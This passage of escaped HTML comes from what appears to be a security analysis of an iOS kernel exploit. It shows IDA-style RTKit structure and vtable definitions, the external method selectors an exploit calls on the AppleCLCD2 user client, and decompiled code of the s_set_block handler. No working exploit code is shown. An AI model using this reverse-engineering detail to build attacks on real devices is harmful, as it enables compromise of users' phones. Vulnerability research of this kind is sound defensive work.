RTKIT_RC_RTTI_BASE_vtbl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__vftable &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;/*VFT*/&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t refcnt&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;typeid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;(These structure definitions are in the format IDA uses for C++-like objects)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;RTKit&lt;/span&gt;&lt;span&gt;&amp;nbsp;base class has a vtable pointer, a reference count and a four-byte Run Time Type Information (RTTI) field - a 4-byte ASCII identifier like &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BLHA&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;WOLO&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;MMAP&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UNPI&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;OSST&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;OSBO&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;and so on. These identifiers look a bit cryptic but they're quite descriptive once you figure them out (and I'll describe the relevant ones as we encounter them.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The base type has the following associated vtable:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.e2f588f986d4c4d814dde7976c00d512e7353bbe\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;/*VFT*/&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;RTKIT_RC_RTTI_BASE_vtbl&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;take_ref&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;drop_ref&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;take_global_type_ref&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;drop_global_type_ref&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;getClassName&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;dtor_a&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__cdecl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;unk&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;RTKIT_RC_RTTI_BASE &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;h2 class=\"HovzfPYjjR-c15 HovzfPYjjR-c8\" id=\"h.17hwrgmah5ee\"&gt;&lt;span class=\"HovzfPYjjR-c16 HovzfPYjjR-c2\"&gt;Exploit flow&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The exploit running in the app starts by opening an IOKit user client for the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleCLCD2&lt;/span&gt;&lt;span&gt;&amp;nbsp;service. &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleCLCD&lt;/span&gt;&lt;span&gt;&amp;nbsp;seems to be the application processor of &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOMobileFrameBuffer&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleCLCD2&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;DCP&lt;/span&gt;&lt;span&gt;&amp;nbsp;version.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The exploit only calls 3 different external method selectors on the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;AppleCLCD2&lt;/span&gt;&lt;span&gt;&amp;nbsp;user client: &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;68&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;78&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;79&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;The one with the largest and most interesting-looking input is 78, which corresponds to this user client method in the kernel driver:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.c1d0de88bea2ae99b6a4f974f60cac134013db41\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOReturn&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOMobileFramebufferUserClient&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;::&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;s_set_block&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOMobileFramebufferUserClient&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;void&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;reference&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;IOExternalMethodArguments&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;const&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;unsigned&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__int64 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;extra_args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; u8 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structureInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; structureInput &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structureInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;if&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;structureInput &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInputCount &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;&amp;gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;if&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInputCount &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;==&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; extra_args &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;else&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; extra_args &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInput &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;+&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c10\"&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;return&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;framebuffer_ap&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;set_block_dcp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;this&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;task&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;],&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;[&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;],&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;extra_args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;scalarInputCount &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;structureInput&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;args&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;structureInputSize&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;}&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;else&lt;/span&gt;&lt;span 